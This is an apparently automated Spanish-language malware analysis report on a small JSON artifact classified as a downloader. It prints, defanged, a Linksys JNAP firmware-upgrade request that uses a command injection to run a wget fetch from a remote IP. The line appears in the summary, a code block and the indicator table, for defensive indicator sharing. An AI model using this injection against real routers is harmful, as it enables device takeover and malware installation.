# 🧬 Payload Analysis

`d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc`

## 📌 Resumen

Artefacto identificado como JSON text data de 251 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/w` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc.md](../../../../../malware-like/oraculo/downloader/d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc`
- **MD5:** `367bf92b31ef3de035b856d1a0517c8e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 251 B |
| Entropía | 5.16 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=5

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w | strings |
| hash | d9bdff141a2613e5f3a62a5760af35c09f05a9ed7e9170061b7eb5a341863bdc | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
